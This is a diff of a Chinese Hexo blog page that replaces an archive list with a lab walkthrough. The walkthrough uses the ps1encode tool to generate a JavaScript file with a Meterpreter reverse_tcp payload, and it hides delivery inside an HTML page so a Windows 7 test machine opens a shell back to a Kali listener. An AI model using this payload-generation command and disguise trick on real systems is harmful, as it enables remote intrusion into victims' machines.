@@ -5,15 +5,28 @@
   
 
   
-  <title>Archives | Hexo</title>
+  <title>利用js文件反弹shell | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+  <meta name="description" content="前言本篇文章是按照大佬的文章复现本文只用于测试，请不要将其用于非法途径公众号： 洛米唯熊 环境 攻击： kaliip: 192.168.248.132 测试： windows 7 x64ip: 192.168.248.136工具地址https://github.com/CroweCybersecurity/ps1encode克隆在kali克隆工具命令：git clone https://githu">
+<meta name="keywords" content="js反弹shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用js文件反弹shell">
+<meta property="og:url" content="http://yoursite.com/2019/10/04/利用js文件反弹shell/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言本篇文章是按照大佬的文章复现本文只用于测试，请不要将其用于非法途径公众号： 洛米唯熊 环境 攻击： kaliip: 192.168.248.132 测试： windows 7 x64ip: 192.168.248.136工具地址https://github.com/CroweCybersecurity/ps1encode克隆在kali克隆工具命令：git clone https://githu">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E7%94%9F%E6%88%90js%E8%84%9A%E6%9C%AC2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E7%94%9F%E6%88%90.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190707191042260.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/windows%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%89%A7%E8%A1%8C.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E5%85%81%E8%AE%B8%E8%84%9A%E6%9C%AC.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E7%9B%91%E5%90%AC%E6%8E%A5%E5%8F%A3%E5%8F%8D%E5%BC%B9shell2.png">
+<meta property="og:updated_time" content="2019-07-10T11:32:58.655Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hexo">
+<meta name="twitter:title" content="利用js文件反弹shell">
+<meta name="twitter:description" content="前言本篇文章是按照大佬的文章复现本文只用于测试，请不要将其用于非法途径公众号： 洛米唯熊 环境 攻击： kaliip: 192.168.248.132 测试： windows 7 x64ip: 192.168.248.136工具地址https://github.com/CroweCybersecurity/ps1encode克隆在kali克隆工具命令：git clone https://githu">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E7%94%9F%E6%88%90js%E8%84%9A%E6%9C%AC2.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -60,216 +73,79 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main">
-  
-  
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2019/10/04/远程文件包含错误解决方法/" class="archive-article-date">
-  <time datetime="2019-10-03T16:00:18.052Z" itemprop="datePublished">Oct 4</time>
+        <section id="main"><article id="post-利用js文件反弹shell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/04/利用js文件反弹shell/" class="article-date">
+  <time datetime="2019-10-03T16:00:18.048Z" itemprop="datePublished">2019-10-04</time>
 </a>
-      
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/shell/">shell</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/04/远程文件包含错误解决方法/">错误提示【URL file-access is disabled in the server configuration in】解决</a>
+    <h1 class="article-title" itemprop="name">
+      利用js文件反弹shell
     </h1>
   
 
-    </header>
-  </div>
-</article>
-  
+      </header>
     
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2019/10/04/删除github的某个文件/" class="archive-article-date">
-  <time datetime="2019-10-03T16:00:18.051Z" itemprop="datePublished">Oct 4</time>
-</a>
+    <div class="article-entry" itemprop="articleBody">
       
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/04/删除github的某个文件/">删除github的某个文件</a>
-    </h1>
-  
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章是按照大佬的文章复现<br>本文只用于测试，请不要将其用于非法途径<br>公众号： 洛米唯熊</p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
+<li>攻击： kali<pre><code>ip: 192.168.248.132</code></pre></li>
+<li>测试： windows 7 x64<pre><code>ip: 192.168.248.136</code></pre><h1 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h1><a href="https://github.com/CroweCybersecurity/ps1encode" target="_blank" rel="noopener">https://github.com/CroweCybersecurity/ps1encode</a><h1 id="克隆"><a href="#克隆" class="headerlink" title="克隆"></a>克隆</h1>在kali克隆工具<br>命令：<code>git clone https://github.com/CroweCybersecurity/ps1encode.git</code></li>
+</ul>
+<h1 id="生成js脚本"><a href="#生成js脚本" class="headerlink" title="生成js脚本"></a>生成js脚本</h1><p>命令：<code>./pslencode.rb --LHOST 192.168.248.132 --LPORT 4444 --PAYLOAD windows/meterpreter/reverse_tcp --ENCODE cmd -t js</code><br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E7%94%9F%E6%88%90js%E8%84%9A%E6%9C%AC2.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E7%94%9F%E6%88%90.png" alt></p>
+<blockquote>
+<p> 复制文本放到文件中生成1.js文件</p>
+</blockquote>
+<h1 id="监听端口反弹shell"><a href="#监听端口反弹shell" class="headerlink" title="监听端口反弹shell"></a>监听端口反弹shell</h1><p><img src="https://img-blog.csdnimg.cn/20190707191042260.png" alt="在这里插入图片描述"></p>
+<h1 id="windows执行文件"><a href="#windows执行文件" class="headerlink" title="windows执行文件"></a>windows执行文件</h1><p>直接执行的话可能比较明显，所以参照文章我们写了一个1.html文件<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/windows%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6.png" alt><br>执行1.html文件，选择运行-&gt;允许阻止内容-&gt;选择是，就反弹成功了<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%89%A7%E8%A1%8C.png" alt><br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E5%85%81%E8%AE%B8%E8%84%9A%E6%9C%AC.png" alt></p>
+<h1 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h1><h2 id><a href="#" class="headerlink" title></a><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E7%9B%91%E5%90%AC%E6%8E%A5%E5%8F%A3%E5%8F%8D%E5%BC%B9shell2.png" alt></h2><p>复现完成，过程简单，值得一学</p>
 
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2019/10/04/配置nat实现网络互通/" class="archive-article-date">
-  <time datetime="2019-10-03T16:00:18.050Z" itemprop="datePublished">Oct 4</time>
-</a>
       
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/04/配置nat实现网络互通/">配置NAT实现网络互通</a>
-    </h1>
-  
-
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2019/10/04/利用js文件反弹shell/" class="archive-article-date">
-  <time datetime="2019-10-03T16:00:18.048Z" itemprop="datePublished">Oct 4</time>
-</a>
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/04/利用js文件反弹shell/" data-id="ck1avz65v000sacv4wpiicqad" class="article-share-link">Share</a>
       
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/04/利用js文件反弹shell/">利用js文件反弹shell</a>
-    </h1>
-  
-
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2019/10/04/解决wireshark没有捕获端口的问题/" class="archive-article-date">
-  <time datetime="2019-10-03T16:00:18.047Z" itemprop="datePublished">Oct 4</time>
-</a>
       
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/04/解决wireshark没有捕获端口的问题/">解决wireshark没有捕获端口的问题</a>
-    </h1>
-  
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/js反弹shell/">js反弹shell</a></li></ul>
 
-    </header>
+    </footer>
   </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/10/04/配置nat实现网络互通/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          配置NAT实现网络互通
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/10/04/解决wireshark没有捕获端口的问题/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">解决wireshark没有捕获端口的问题</div>
+    </a>
+  
+</nav>
+
+  
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2019/10/04/Vulnhub之DC-1[find提权]/" class="archive-article-date">
-  <time datetime="2019-10-03T16:00:18.046Z" itemprop="datePublished">Oct 4</time>
-</a>
-      
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/04/Vulnhub之DC-1[find提权]/">Vulnhub之DC-1 find 提权骚思路</a>
-    </h1>
-  
-
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2019/10/04/Vulnhub靶机之DC-4/" class="archive-article-date">
-  <time datetime="2019-10-03T16:00:18.045Z" itemprop="datePublished">Oct 4</time>
-</a>
-      
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/04/Vulnhub靶机之DC-4/">DC-4 复现</a>
-    </h1>
-  
-
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2019/10/04/Vulnhub靶机之DC-3/" class="archive-article-date">
-  <time datetime="2019-10-03T16:00:18.043Z" itemprop="datePublished">Oct 4</time>
-</a>
-      
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/04/Vulnhub靶机之DC-3/">Vulnhub之DC-3 joomla注入和ubutnu16.04 提权</a>
-    </h1>
-  
-
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2019/10/04/Vulnhub 之 DC-6 靶机复现/" class="archive-article-date">
-  <time datetime="2019-10-03T16:00:18.042Z" itemprop="datePublished">Oct 4</time>
-</a>
-      
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/04/Vulnhub 之 DC-6 靶机复现/">Vulnhub 之 DC-6 靶机复现</a>
-    </h1>
-  
-
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2019/10/04/Vulnhub 之 DC-5 靶机复现/" class="archive-article-date">
-  <time datetime="2019-10-03T16:00:18.041Z" itemprop="datePublished">Oct 4</time>
-</a>
-      
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/04/Vulnhub 之 DC-5 靶机复现/">DC-5 复现</a>
-    </h1>
-  
-
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-
-  <nav id="page-nav">
-    
-    <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
-  </nav>
 
 </section>
         
